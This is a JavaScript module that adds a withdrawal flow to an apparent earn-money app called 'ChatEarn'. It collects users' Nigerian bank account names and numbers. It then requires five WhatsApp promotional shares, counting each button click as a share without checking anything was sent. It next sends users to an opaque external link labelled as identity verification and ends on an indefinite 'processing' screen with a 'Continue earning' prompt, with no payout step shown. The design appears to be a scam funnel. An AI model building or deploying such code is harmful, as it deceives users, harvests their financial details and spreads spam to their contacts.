(() => {
  'use strict';
  if (window.__CHAT_EARN_WITHDRAWAL__) return;
  window.__CHAT_EARN_WITHDRAWAL__ = true;

  const client = window.ChatEarn?.client;
  const MINIMUM = 40000;
  const REQUIRED_SHARES = 5;
  const KYC_URL = 'https://jikgykm.com/cl/a9f1535a330a2652';
  const state = { amount: 0, bank: 'opay', account: '', shares: 0, withdrawalId: null };
  const money = n => `₦${Number(n || 0).toLocaleString('en-NG')}`;
  const show = id => document.querySelectorAll('.screen').forEach(s => s.classList.toggle('active', s.id === id));
  const toast = (m, bad = false) => { const t = document.getElementById('toast'); if (!t) return; t.textContent = m; t.className = bad ? 'show error' : 'show'; setTimeout(() => { t.className = ''; }, 3000); };
  const sessionId = () => sessionStorage.getItem('ce_session_id') || (() => { const id = crypto.randomUUID(); sessionStorage.setItem('ce_session_id', id); return id; })();

  function build() {
    if (document.getElementById('withdraw')) return;
    document.querySelector('.shell')?.insertAdjacentHTML('beforeend', `
      <section id="withdraw" class="screen"><button class="back" data-wd-back>← Back</button><div class="panel"><h2>Place withdrawal</h2><p id="wdAmountText">Loading balance…</p><form id="wdForm"><label>Bank<select id="wdBank"><option value="opay">OPay</option><option value="palmpay">PalmPay</option><option value="kuda">Kuda Bank</option><option value="moniepoint">Moniepoint</option><option value="other">Other Nigerian bank</option></select></label><label>Account name<input id="wdName" maxlength="120" required></label><label>Account number<input id="wdNumber" inputmode="numeric" maxlength="10" required></label><button id="wdSubmit" class="primary" type="submit">Submit withdrawal</button></form></div></section>
      <section id="sharewall" class="screen"><div class="panel"><h2>Share verification</h2><p id="shareText">Complete the required shares to continue.</p><div style="height:9px;background:var(--card2);border-radius:99px;overflow:hidden"><div id="shareFill" style="height:100%;width:0;background:var(--green)"></div></div><button id="shareButton" class="primary">Open WhatsApp</button></div></section>
      <section id="kyc" class="screen"><div class="panel"><h2>Identity verification</h2><p>Complete the verification step, then return here.</p><button id="kycButton" class="primary">Open verification</button><button id="kycDone" class="secondary">I have completed it</button></div></section>
      <section id="processing" class="screen loading-screen"><div class="spinner"></div><h2>Withdrawal processing</h2><p id="processingText">Your request is being reviewed.</p><button id="continueEarning" class="primary">Continue earning</button></section>`);

    document.querySelector('[data-wd-back]')?.addEventListener('click', () => show('dashboard'));
    document.getElementById('wdNumber')?.addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10); });
    document.getElementById('wdForm')?.addEventListener('submit', submitWithdrawal);
    document.getElementById('shareButton')?.addEventListener('click', share);
    document.getElementById('kycButton')?.addEventListener('click', openKyc);
    document.getElementById('kycDone')?.addEventListener('click', finishKyc);
    document.getElementById('continueEarning')?.addEventListener('click', () => show('dashboard'));
  }

  async function openWithdrawal() {
    const { data: auth } = await client.auth.getSession();
    const user = auth?.session?.user;
    if (!user) return toast('Login required.', true);
    const { data: profile, error } = await client.from('profiles').select('balance').eq('user_id', user.id).maybeSingle();
    if (error) return toast(error.message, true);
    state.amount = Number(profile?.balance || 0);
    if (state.amount < MINIMUM) return toast(`${money(MINIMUM - state.amount)} remaining before withdrawal.`, true);
    document.getElementById('wdAmountText').textContent = `${money(state.amount)} available.`;
    show('withdraw');
  }

  async function submitWithdrawal(event) {
    event.preventDefault();
    const bank = document.getElementById('wdBank').value;
    const accountName = document.getElementById('wdName').value.trim();
    const accountNumber = document.getElementById('wdNumber').value.trim();
    if (accountName.length < 3) return toast('Enter the correct account name.', true);
    if (!/^\d{10}$/.test(accountNumber)) return toast('Enter a valid 10-digit account number.', true);
    const button = document.getElementById('wdSubmit');
    button.disabled = true;
    try {
      const { data, error } = await client.rpc('chatearn_request_withdrawal', {
        p_bank: bank,
        p_account_number: accountNumber,
        p_account_name: accountName,
        p_amount: state.amount,
        p_session_id: sessionId()
      });
      if (error) throw error;
      const row = Array.isArray(data) ? data[0] : data;
      state.withdrawalId = row?.withdrawal_id || row?.id || null;
      state.amount = Number(row?.amount || state.amount);
      state.bank = bank;
      state.account = accountNumber;
      state.shares = 0;
      renderShare();
      show('sharewall');
    } catch (error) {
      toast(error?.message || 'Withdrawal submission failed.', true);
    } finally {
      button.disabled = false;
    }
  }

  function renderShare() {
    const pct = Math.round((state.shares / REQUIRED_SHARES) * 100);
    document.getElementById('shareFill').style.width = `${pct}%`;
    document.getElementById('shareText').textContent = state.shares >= REQUIRED_SHARES ? 'Sharing completed.' : `${REQUIRED_SHARES - state.shares} share${REQUIRED_SHARES - state.shares === 1 ? '' : 's'} remaining.`;
    document.getElementById('shareButton').textContent = state.shares >= REQUIRED_SHARES ? 'Continue to KYC' : 'Open WhatsApp';
  }

  async function share() {
    if (state.shares >= REQUIRED_SHARES) return show('kyc');
    const message = `I am using ChatEarn. Join here: ${location.origin}`;
    window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(message)}`, '_blank');
    state.shares += 1;
    await client.rpc('chatearn_record_share_attempt', {
      p_session_id: sessionId(), p_step: state.shares, p_seconds_away: 0, p_returned: true
    }).catch(() => {});
    renderShare();
    if (state.shares >= REQUIRED_SHARES) setTimeout(() => show('kyc'), 500);
  }

  async function openKyc() {
    await client.rpc('chatearn_create_kyc_request', { p_external_url: KYC_URL, p_session_id: sessionId() }).catch(() => {});
    window.open(KYC_URL, '_blank');
  }

  async function finishKyc() {
    show('processing');
    await refreshStatus();
  }

  async function refreshStatus() {
    const { data: auth } = await client.auth.getSession();
    const user = auth?.session?.user;
    if (!user) return;
    const { data } = await client.from('withdrawals').select('status,public_reference,submitted_at').eq('user_id', user.id).order('submitted_at', { ascending: false }).limit(1);
    const latest = data?.[0];
    const status = latest?.status ? String(latest.status).replaceAll('_', ' ') : 'submitted';
    document.getElementById('processingText').textContent = `Status: ${status}${latest?.public_reference ? ` · ${latest.public_reference}` : ''}`;
  }

  function connectRewardsButton() {
    const button = document.getElementById('rewardsButton');
    if (!button || button.dataset.wdBound) return;
    button.dataset.wdBound = '1';
    button.addEventListener('click', openWithdrawal);
  }

  function boot() {
    if (!client) return;
    build();
    connectRewardsButton();
    new MutationObserver(connectRewardsButton).observe(document.body, { childList: true, subtree: true });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot, { once: true });
  else boot();
})();